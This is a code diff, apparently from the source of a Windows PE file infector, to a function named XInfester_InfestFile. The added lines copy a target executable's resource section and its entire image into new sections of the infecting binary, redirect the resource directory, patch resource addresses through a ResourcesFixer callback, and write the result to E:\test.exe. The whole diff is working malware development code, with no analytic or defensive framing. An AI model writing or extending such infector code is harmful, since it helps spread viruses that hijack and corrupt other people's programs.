@@ -52,14 +52,20 @@ size_t GetfileSize(const char *FileName)
 }
 
 
+DWORD vTemp_NewResRVAOffset;
+PEStructure *vTemp_DestPE;
+
+void ResourcesFixer(WORD *id,wchar_t *Name,DWORD length,DWORD *offsetToDataEnter,DWORD *size1,DWORD *DataRVA,void *Buffer)
+{
+	(*DataRVA)=vTemp_DestPE->RVA_To_FOA(*DataRVA)+vTemp_NewResRVAOffset;
+}
+
 
 
 BOOL XInfester_InfestFile( const char *pDestFileName )
 {
 	PEStructure __Dest,__Final;
 	FILE *Destfp=NULL;
-
-	char Buffer[1024]; //1k Buffer for W/R
 
 	size_t SelfFileSize;
 	size_t DestFileSize;
@@ -96,20 +102,46 @@ BOOL XInfester_InfestFile( const char *pDestFileName )
 	
 	//Copy destPE resource section
 	DWORD newResourceRVA;
+
 	if(!__Final.AddSection
 		(
 		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
 		(char *)__Final.GetSectionName(__Final.GetResourceDirctorySectionIndex()),
-		__Final.GetDirectorySize(2),
+		__Dest.GetDirectorySize(2),
 		newResourceRVA,
-		__Final.GetDirectoryBufferPointer(2)
+		__Dest.GetDirectoryDataBufferPointer(2)
 		)
 		)
 	{
 		goto _ERR;
 	}
 
+	DWORD HostRVA;
+	//Copy host file to section
+	if (!__Final.AddSection
+		(
+		__Final.GetSectionCharacter(__Final.GetResourceDirctorySectionIndex()),
+		XINFESTED_SECTION_STRING,
+		__Dest.GetImageSize(),
+		HostRVA,
+		__Dest.ImagePointer(0)
+		)
+	)
+	{
+		goto _ERR;
+	}
 
+	//Redirect resource section
+	__Final.GetImageDirectory(2)->VirtualAddress=newResourceRVA;
+	__Final.GetImageDirectory(2)->Size=__Dest.GetDirectorySize(2);
+
+	//
+	vTemp_NewResRVAOffset=HostRVA;
+	vTemp_DestPE=&__Dest;
+	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);
+
+
+	__Final.Dump("E:\\test.exe");
 	//Files open
 	__Dest.free();
 	__Final.free();
